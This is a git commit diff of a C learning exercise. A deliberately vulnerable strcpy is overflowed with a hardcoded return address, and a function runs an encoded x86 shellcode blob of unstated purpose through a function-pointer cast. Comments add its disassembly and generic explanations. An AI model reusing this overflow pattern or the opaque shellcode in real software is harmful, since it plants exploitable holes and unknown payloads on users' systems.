85ac34e39a4c7cca34e0adae8e37deac3c3215cb
Rafael Z Tanganelli <kabelu@gmail.com>
2023-05-19 13:59:23 +0200

    Updating Tsunami

--- Shared/Tsunami/hello.c
+++ Shared/Tsunami/hello.c
@@ -1,51 +1,150 @@
-#include <stdio.h>
 #include <string.h>
+#include <stdio.h>
 
-void executeShellcode();
+void vulnerable_function(char *str)
+{
+	char	buffer[15];
+	strcpy(buffer, str);
 
-int caca(int argc, char *argv[])
+}
+
+void	shellcode()
 {
 
-    char buffer[8]; // Tama�o del buffer
-    if (argc < 2)
-    {
-        printf("Argumento faltante.\n");
-        return 1;
-    }
-    memcpy(buffer, argv[1],14); // Copia el argumento en el buffer
-/*
-    if (strlen(buffer) > sizeof(buffer))
-    {
-        printf("Argumento demasiado largo. Ejecutando shellcode...\n");
-        executeShellcode();
-    }
-    else
-    {
-        printf("Argumento valido. No se ejecuta el shellcode.\n");
-    }
+	unsigned char shellcode[] = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
+								"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
+								"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
+								"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
+								"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
+								"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
+								"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
+								"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
+								"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
+								"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
+								"\x7f\xe8\x7b\xca";
+	((void (*)())shellcode)();
+
+}
+
+int main(int argc, char **argv)
+{
+	(void) argc;
+	(void) argv;
+	vulnerable_function("09874500064888675436\x80\x10\x40\x00");
+
+	return (0);
+}
+
+/* Disassembly hexcode (https://defuse.ca/online-x86-assembler.htm#disassembly2)
+0:  db c0                   fcmovnb st,st(0)
+2:  31 c9                   xor    ecx,ecx
+4:  bf 7c 16 70 cc          mov    edi,0xcc70167c
+9:  d9 74 24 f4             fnstenv [esp-0xc]
+d:  b1 1e                   mov    cl,0x1e
+f:  58                      pop    eax
+10: 31 78 18                xor    DWORD PTR [eax+0x18],edi
+13: 83 e8 fc                sub    eax,0xfffffffc
+16: 03 78 68                add    edi,DWORD PTR [eax+0x68]
+19: f4                      hlt
+1a: 85 30                   test   DWORD PTR [eax],esi
+1c: 78 bc                   js     0xffffffda
+1e: 65 c9                   gs leave
+20: 78 b6                   js     0xffffffd8
+22: 23 f5                   and    esi,ebp
+24: f3 b4 ae                repz mov ah,0xae
+27: 7d 02                   jge    0x2b
+29: aa                      stos   BYTE PTR es:[edi],al
+2a: 3a 32                   cmp    dh,BYTE PTR [edx]
+2c: 1c bf                   sbb    al,0xbf
+2e: 62                      (bad)
+2f: ed                      in     eax,dx
+30: 1d 54 d5 66 29          sbb    eax,0x2966d554
+35: 21 e7                   and    edi,esp
+37: 96                      xchg   esi,eax
+38: 60                      pusha
+39: f5                      cmc
+3a: 71 ca                   jno    0x6
+3c: 06                      push   es
+3d: 35 f5 14 c7 7c          xor    eax,0x7cc714f5
+42: fb                      sti
+43: 1b 05 6b f0 27 dd       sbb    eax,DWORD PTR ds:0xdd27f06b
+49: 48                      dec    eax
+4a: fd                      std
+4b: 22 38                   and    bh,BYTE PTR [eax]
+4d: 1b a2 e8 c3 f7 3b       sbb    esp,DWORD PTR [edx+0x3bf7c3e8]
+53: 7a cf                   jp     0x24
+55: 4c                      dec    esp
+56: 4f                      dec    edi
+57: 23 d3                   and    edx,ebx
+59: 53                      push   ebx
+5a: a4                      movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
+5b: 57                      push   edi
+5c: f7 d8                   neg    eax
+5e: 3b 83 8e 83 1f 57       cmp    eax,DWORD PTR [ebx+0x571f838e]
+64: 53                      push   ebx
+65: 64 51                   fs push ecx
+67: a1 33 cd f5 c6          mov    eax,ds:0xc6f5cd33
+6c: f5                      cmc
+6d: c1 7e 98 f5             sar    DWORD PTR [esi-0x68],0xf5
+71: aa                      stos   BYTE PTR es:[edi],al
+72: f1                      icebp
+73: 05 a8 26 99 3d          add    eax,0x3d9926a8
+78: 3b c0                   cmp    eax,eax
+7a: d9 fe                   fsin
+7c: 51                      push   ecx
+7d: 61                      popa
+7e: b6 0e                   mov    dh,0xe
+80: 2f                      das
+81: 85 19                   test   DWORD PTR [ecx],ebx
+83: 87 b7 78 2f 59 90       xchg   DWORD PTR [edi-0x6fa6d088],esi
+89: 7b d7                   jnp    0x62
+8b: 05 7f e8 7b ca          add    eax,0xca7be87f 
 */
-    return 0;
-}
 
-void executeShellcode()
-{
-    unsigned char shellcode[] = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1"
-                               "\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30"
-                               "\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa"
-                               "\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96"
-                               "\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b"
-                               "\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a"
-                               "\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83"
-                               "\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98"
-                               "\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
-                               "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05"
-                               "\x7f\xe8\x7b\xca";
-    ((void (*)())shellcode)();
-}
+/*
+To understand this, it's important to know that assembly language is a low-level programming language for a computer, or other programmable device, in which there is a very strong correspondence between the language and the architecture's machine code instructions. Here is a simplified explanation of a few of the instructions mentioned in the code:
 
-int main()
-{
-	char *argv[2] = {"aa", "hello    aa\x00\xb0\xb7\x40"};
-	caca(2, argv);
-	printf("hola");
-}
+    fcmovnb st,st(0): This command does a floating-point comparison and move if not below. Essentially, it is trying to perform an operation on the top of the floating-point stack (which in this case does nothing).
+
+    xor ecx,ecx: This command is using the XOR operation (exclusive or) to set the value of ecx to 0. If you XOR anything with itself, the result is zero.
+
+    mov edi,0xcc70167c: This command moves the hexadecimal value 0xcc70167c into the edi register. The mov command is used to transfer data from one location to another.
+
+    fnstenv [esp-0xc]: This command saves the current state of the floating-point unit to the memory location indicated (esp-0xc in this case).
+
+    pop eax: This command removes (pops) the top value from the stack and puts it into the eax register.
+
+    xor DWORD PTR [eax+0x18],edi: This command XORs the value at the memory location eax+0x18 with the value in edi, and stores the result at the memory location eax+0x18.
+
+    sub eax,0xfffffffc: This command subtracts 0xfffffffc from eax and stores the result in eax.
+
+    add edi,DWORD PTR [eax+0x68]: This command adds the value at the memory location eax+0x68 to the value in edi, and stores the result in edi.
+
+    hlt: This command halts the CPU. This means that it stops all CPU functions except for functions that respond to an interrupt.
+
+The remaining commands perform similar operations (moving data, adding, subtracting, performing bitwise operations, etc.), often based on certain conditions.
+
+Remember that even though we can explain what individual instructions do, understanding the overall intent of a piece of assembly code, especially one as complex and potentially obfuscated as this, can be quite challenging. The same piece of assembly code can do very different things depending on the context in which it is used.
+
+----
+
+The provided assembly code appears to be shellcode, often used in exploit development for tasks like spawning a shell, creating a reverse connection, or executing specific system commands. However, without contextual information, it's tough to determine its exact purpose.
+
+For educational purposes, here's a rough explanation of some of the instructions:
+
+    fcmovnb st,st(0): Floating-point conditional move if not below. This doesn't really make sense in this context, as it moves st(0) to st(0), essentially a no-op. This could be used for obfuscation or might be a disassembly error.
+    xor ecx,ecx: XORs the ecx register with itself, setting it to zero.
+    mov edi,0xcc70167c: Moves the hexadecimal value 0xcc70167c into the edi register.
+    fnstenv [esp-0xc]: Stores the current x87 FPU environment to the memory at esp-0xc. This can be used for instruction pointer discovery in shellcode.
+    pop eax: Removes the top value from the stack and places it in eax.
+    xor DWORD PTR [eax+0x18],edi: XORs the DWORD value at the address eax+0x18 with edi.
+    sub eax,0xfffffffc: Subtracts 0xfffffffc (or adds 4, due to two's complement) from eax.
+    add edi,DWORD PTR [eax+0x68]: Adds the DWORD value at address eax+0x68 to edi.
+    hlt: Halts the CPU until the next external interrupt is fired. In most cases, the code execution should not reach this point.
+
+Further down, there are many jumps, bitwise operations, and comparisons which could be part of a conditional execution logic, buffer operation, or decoding routine.
+
+Again, without contextual information, it's very difficult to provide a clear explanation of what this code does exactly. It might not even perform a sensible operation when executed, given it appears to have some disassembly errors and odd instructions.
+
+For better understanding, it would be beneficial to run it in a controlled environment such as a virtual machine, using a debugger to step through the code and see how it behaves dynamically. However, ensure that this is done in a safe and responsible manner to avoid potential harm to your system or data.
+*/
